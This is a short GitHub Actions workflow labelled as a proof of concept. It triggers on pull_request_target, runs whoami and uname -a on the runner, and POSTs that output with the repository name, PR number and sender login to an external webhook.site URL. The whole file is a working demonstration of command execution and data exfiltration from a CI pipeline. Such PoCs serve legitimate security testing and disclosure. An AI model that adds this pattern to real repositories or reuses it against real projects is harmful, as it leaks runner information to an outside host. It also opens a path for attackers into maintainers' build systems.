name: PoC Workflow

on:
  pull_request_target:
    branches: [ main ]

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: Run system commands
        run: |
          echo "### System Information"
          whoami
          echo ""
          uname -a
          echo ""
          echo "Current directory: $(pwd)"
          echo "### End of System Info"

      - name: Send to webhook
        run: |
          SYSTEM_INFO=$(whoami && echo "" && uname -a)
          curl -X POST \
            -H "Content-Type: application/json" \
            -d "{\"event\":\"pull_request_target\",\"system_info\":\"$SYSTEM_INFO\",\"repository\":\"${{ github.repository }}\",\"pr_number\":\"${{ github.event.pull_request.number }}\",\"sender\":\"${{ github.event.sender.login }}\"}" \
            https://webhook.site/85ab779f-18d6-40c5-831e-c0e62f1e4537
